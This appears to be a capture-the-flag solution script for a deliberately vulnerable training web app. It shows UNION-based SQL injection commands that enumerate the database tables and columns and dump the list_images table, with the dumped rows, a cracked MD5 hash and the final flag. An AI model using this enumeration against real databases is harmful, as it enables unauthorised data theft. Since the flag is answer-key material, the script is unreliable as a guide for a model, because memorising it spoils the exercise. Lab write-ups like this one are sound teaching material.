#!/bin/bash

python union_enumerator.py "table_name from information_schema.tables"
# db_default
# users
# guestbook
# list_images
# vote_dbs
python union_enumerator.py "column_name from information_schema.columns where table_name = " "list_images"
# ----------------------------------------------------------------------------------------------------
# table_name: list_images
# column_name from information_schema.columns where table_name =  0x6c6973745f696d61676573
#  id
#  url
#  title
#  comment
# ----------------------------------------------------------------------------------------------------
fields="id url title comment"
for field in $fields; do
	python union_enumerator.py $field" from list_images"
done;
# ----------------------------------------------------------------------------------------------------
# id from list_images
#  1
#  2
#  3
#  4
#  5
#  6
# ----------------------------------------------------------------------------------------------------
# url from list_images
#  https://www.nsa.org/img.jpg
#  https://www.42.fr/42.png
#  https://www.google.fr/google.png
#  https://www.obama.org/obama.jpg
#  borntosec.ddns.net/images.png
#  https://www.h4x0r3.0rg/tr0ll.png
# ----------------------------------------------------------------------------------------------------
# title from list_images
#  Nsa
#  42 !
#  Google
#  Obama
#  Hack me ?
#  tr00l
# ----------------------------------------------------------------------------------------------------
# comment from list_images
#  An image about the NSA !
#  There is a number..
#  Google it !
#  Yes we can !
#  If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
#  Because why not ?
# ----------------------------------------------------------------------------------------------------
echo "1928e8083cf461a51303633093573c46 MD5 : albatroz"
echo "flag: f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188"
